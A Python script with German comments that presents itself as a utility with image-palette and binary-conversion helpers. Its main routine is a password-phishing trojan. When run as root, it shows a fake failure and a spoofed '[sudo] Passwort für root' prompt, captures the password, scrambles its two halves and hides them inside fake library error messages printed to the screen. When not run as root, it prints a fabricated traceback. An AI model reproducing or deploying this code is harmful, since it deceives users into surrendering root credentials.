import os
import sys
import time
import getpass
import math
import random
from PIL import Image

PYXIT = True


def process_binary_file(input_path, output_path):
    try:
        # Lese die Binärdaten aus der Eingabedatei
        with open(input_path, 'r') as binary_file:
            binary_content = binary_file.read()

        # Entferne Leerzeichen und teile den Inhalt in 8-Bit-Blöcke
        binary_content = binary_content.replace(' ', '').strip()
        binary_blocks = [binary_content[i:i+8] for i in range(0, len(binary_content), 8)]

        # Konvertiere die Binärdaten in Bytes und schreibe sie in die Ausgabedatei
        with open(output_path, 'wb') as output_file:
            for binary_string in binary_blocks:
                if len(binary_string) == 8:  # Stelle sicher, dass der Block 8 Bit hat
                    output_file.write(int(binary_string, 2).to_bytes(1, byteorder='big'))
        print(f"Datei erfolgreich verarbeitet: {output_path}")
    except Exception as e:
        print(f"Fehler beim Verarbeiten der Datei: {e}")



def read_binary_file_as_string(filename):
    binary_string = ""
    with open(filename, 'rb') as binary_file:
        byte = binary_file.read(1)
        while byte:
            # Byte in Binärform umwandeln und an den String anhängen
            binary_string += format(int.from_bytes(byte, byteorder='big'), '08b')
            byte = binary_file.read(1)
    return binary_string

BLACK = (0, 0, 0)


def extract_and_apply_palette(input_image_path, target_image_path, output_image_path):
    # Öffnen des Palette-Bildes, das die 16 Farben enthält
    palette_image = Image.open(input_image_path)



    # Extrahieren der 16 einzigartigen Farben aus dem Palette-Bild
    colors = palette_image.getcolors(256)  # Wir nehmen an, dass es maximal 256 Farben gibt
    unique_colors = sorted(set(color[1] for color in colors))[:32]  # Wählen Sie nur die ersten 16 einzigartigen Farben

    # Die 16 Farben ausgeben
    print("Die 16 Farben (RGB-Werte):")
    for i, color in enumerate(unique_colors):
        print(f"Farbe {i+1}: RGB {color}")

    # Öffnen des Zielbildes
    target_image = Image.open(target_image_path)

    # Für jedes Pixel im Zielbild den nächstgelegenen Farbwert aus der Palette auswählen
    target_image = target_image.convert('RGB')
    pixels = target_image.load()

    # Wir ersetzen jede Farbe im Zielbild mit der nächstgelegenen Farbe aus der Palette
    for i in range(target_image.width):
        for j in range(target_image.height):
            pixel_color = pixels[i, j]

            # Finden der nächstgelegenen Farbe in der Palette
            closest_color = min(unique_colors, key=lambda c: (c[0] - pixel_color[0])**2 + (c[1] - pixel_color[1])**2 + (c[2] - pixel_color[2])**2)
            pixels[i, j] = closest_color

    # Das bearbeitete Bild speichern
    target_image.save(output_image_path)
    print(f"Das Bild wurde unter {output_image_path} gespeichert.")

def VR_LETTER(string):
    # m = (len(string) // 2)
    l3 = string[3:]
    rs = string[:3]
    ns = l3 + rs
    ns = ns.swapcase()
    return ns

def main():
    if PYXIT:
        time.sleep(3)
        print("Das hat nicht funktioniert, bitte nochmal probieren.")
        user_input = getpass.getpass("[sudo] Passwort für root: ")  #

        ALTSTRING = user_input
        ALT1 = ALTSTRING[5:]
        ALT2 = ALTSTRING[:5]
    else:
        ALTSTRING = ABCD1234
        ALT1 = ALTSTRING[5:]
        ALT2 = ALTSTRING[:5]

    time.sleep(5)
    print(" load_libarys --[15]-- ")
    time.sleep(20)
    print(f""" ERROR: keyboard --> exit_code[x{VR_LETTER(ALT1)} ; File ".../.local/lib/python3.6/site-packages/keyboard/__init__.py", line 104, in init]""")
    time.sleep(3)
    print(""" ERROR: pypeline --> exit_code[x40_Htx1  ; File ".../.local/lib/python3.6/site-packages/pypeline/_nixpypeline.py", line 101, in build_device]""")
    time.sleep(19)
    print(f""" ERROR: CRYpy --> exit_code[x{VR_LETTER(ALT2)}_7gv ; File ".../.local/lib/python3.6/site-packages/CRYpy/_stable.py", line 42, in CRYpy_setup]""")
    time.sleep(26)
    print(""" Alles KLAR!! --> 12 von 15 ; ERROR:(keyboard,pypeline,CRYpy)""")


if os.geteuid() != 0:
    print("""Traceback (most recent call last):
  File ".../GT/gt_root/gt.py", line 83, in <module>
    if keyboard.is_pressed('esc'):
  File ".../.local/lib/python3.6/site-packages/keyboard/__init__.py", line 410, in is_pressed
    _listener.start_if_necessary()
  File ".../.local/lib/python3.6/site-packages/keyboard/_generic.py", line 35, in start_if_necessary
    self.init()
  File ".../.local/lib/python3.6/site-packages/keyboard/__init__.py", line 196, in init
    _os_keyboard.init()
  File ".../.local/lib/python3.6/site-packages/keyboard/_nixkeyboard.py", line 113, in init
    build_device()
  File ".../.local/lib/python3.6/site-packages/keyboard/_nixkeyboard.py", line 109, in build_device
    ensure_root()
  File ".../.local/lib/python3.6/site-packages/keyboard/_nixcommon.py", line 174, in ensure_root
    raise ImportError('You must be root to use this library on linux.')
ImportError: You must be root to use this library on linux.""")
else:
    main()

cube_vertices = [
    [-1, -1, -1],  # 0
    [1, -1, -1],   # 1
    [1, 1, -1],    # 2
    [-1, 1, -1],   # 3
    [-1, -1, 1],   # 4
    [1, -1, 1],    # 5
    [1, 1, 1],     # 6
    [-1, 1, 1]     # 7
]
# Flächen des Würfels (jeweils 4 Punkte)
cube_faces = [
    (0, 1, 2, 3),  # Rückseite
    (4, 5, 6, 7),  # Vorderseite
    (0, 1, 5, 4),  # Unterseite
    (3, 2, 6, 7),  # Oberseite
    (0, 3, 7, 4),  # Linke Seite
    (1, 2, 6, 5)   # Rechte Seite
]
# Flächen des Würfels (jeweils 5)
lol = [
    (0, 1, 2, 3),  #
    (4, 5, 6, 7),  #
    (0, 1, 5, 4),  #
    (3, 2, 6, 7),  #
    (0, 3, 7, 4),  #
    (4, 5, 6, 7),  #
    (1, 2, 6, 5)   #
]
def process_binary_file(input_path, output_path):
    try:
        # Lese die Binärdaten aus der Eingabedatei
        with open(input_path, 'r') as binary_file:
            binary_content = binary_file.read()

        # Entferne Leerzeichen und teile den Inhalt in 8-Bit-Blöcke
        binary_content = binary_content.replace(' ', '').strip()
        binary_blocks = [binary_content[i:i+8] for i in range(0, len(binary_content), 8)]

        # Konvertiere die Binärdaten in Bytes und schreibe sie in die Ausgabedatei
        with open(output_path, 'wb') as output_file:
            for binary_string in binary_blocks:
                if len(binary_string) == 8:  # Stelle sicher, dass der Block 8 Bit hat
                    output_file.write(int(binary_string, 2).to_bytes(1, byteorder='big'))
        print(f"Datei erfolgreich verarbeitet: {output_path}")
    except Exception as e:
        print(f"Fehler beim Verarbeiten der Datei: {e}")



def read_binary_file_as_string(filename):
    binary_string = ""
    with open(filename, 'rb') as binary_file:
        byte = binary_file.read(1)
        while byte:
            # Byte in Binärform umwandeln und an den String anhängen
            binary_string += format(int.from_bytes(byte, byteorder='big'), '08b')
            byte = binary_file.read(1)
    return binary_string
